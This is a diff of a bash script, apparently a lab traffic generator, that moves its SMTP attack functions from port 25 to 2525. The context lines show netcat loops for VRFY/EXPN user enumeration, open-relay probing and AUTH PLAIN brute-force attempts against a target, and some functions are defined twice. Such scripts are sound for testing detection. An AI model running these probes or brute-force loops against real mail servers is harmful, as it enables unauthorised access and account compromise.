@@ -207,7 +207,7 @@ attack_smtp_normal(){
             sleep 0.3
             printf "QUIT\r\n"
             sleep 0.3
-        ) | nc -w5 $TARGET 25 2>/dev/null
+        ) | nc -w5 $TARGET 2525 2>/dev/null
         sleep 0.5
     done
     ok "Normal SMTP done"
@@ -225,7 +225,7 @@ attack_smtp_probe(){
             printf "VRFY ${user}\r\n"
             sleep 0.2
             printf "QUIT\r\n"
-        ) | nc -w3 $TARGET 25 2>/dev/null &
+        ) | nc -w3 $TARGET 2525 2>/dev/null &
         sleep 0.2
     done
     wait
@@ -241,7 +241,7 @@ attack_smtp_probe(){
             printf "RCPT TO:<victim@external-domain.com>\r\n"
             sleep 0.2
             printf "QUIT\r\n"
-        ) | nc -w3 $TARGET 25 2>/dev/null &
+        ) | nc -w3 $TARGET 2525 2>/dev/null &
         sleep 0.15
     done
     wait
@@ -264,7 +264,7 @@ attack_smtp_brute(){
                 printf "AUTH PLAIN ${B64}\r\n"
                 sleep 0.2
                 printf "QUIT\r\n"
-            ) | nc -w3 $TARGET 25 2>/dev/null &
+            ) | nc -w3 $TARGET 2525 2>/dev/null &
             sleep 0.15
         done
     done
@@ -331,7 +331,7 @@ attack_full_demo(){
                 printf "RCPT TO:<victim@external.com>\r\n"
                 sleep 0.2
                 printf "QUIT\r\n"
-            ) | nc -w3 $TARGET 25 2>/dev/null &
+            ) | nc -w3 $TARGET 2525 2>/dev/null &
             sleep 0.2
         done
     done
@@ -368,7 +368,7 @@ attack_full_demo(){
 
 # ── ATTACK: SMTP probe ───────────────────────────────────────
 attack_smtp_probe(){
-    log "SMTP probe on port 25 → SMTP service node"
+    log "SMTP probe on port 2525 → SMTP service node"
     for i in $(seq 1 5); do
         (
             sleep 0.3
@@ -383,7 +383,7 @@ attack_smtp_probe(){
             echo "RCPT TO:<root@localhost>"
             sleep 0.3
             echo "QUIT"
-        ) | nc -w4 $TARGET 25 2>/dev/null &
+        ) | nc -w4 $TARGET 2525 2>/dev/null &
         sleep 0.5
     done
     wait
@@ -404,7 +404,7 @@ attack_smtp_enum(){
             echo "EXPN $user"
             sleep 0.2
             echo "QUIT"
-        ) | nc -w3 $TARGET 25 2>/dev/null &
+        ) | nc -w3 $TARGET 2525 2>/dev/null &
         sleep 0.3
     done
     wait
@@ -432,7 +432,7 @@ attack_smtp_normal(){
         echo "."
         sleep 0.3
         echo "QUIT"
-    ) | nc -w5 $TARGET 25 2>/dev/null
+    ) | nc -w5 $TARGET 2525 2>/dev/null
     ok "Normal SMTP send done"
 }
 
